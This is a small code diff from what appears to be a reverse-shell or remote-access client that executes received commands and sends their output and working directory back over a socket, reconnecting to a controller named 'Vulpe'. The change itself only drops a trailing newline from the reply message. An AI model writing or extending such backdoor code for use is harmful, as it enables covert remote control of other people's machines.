@@ -17,7 +17,7 @@ def connection(s):
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
                 output_str = str(output_bytes, "utf-8")
                 cwd = os.getcwd()
-                message = f'{output_str}{cwd}\n'
+                message = f'{output_str}{cwd}'
                 s.send(str.encode(message))
             if not data:
                 print('[-] Trying to reconnect to Vulpe..')
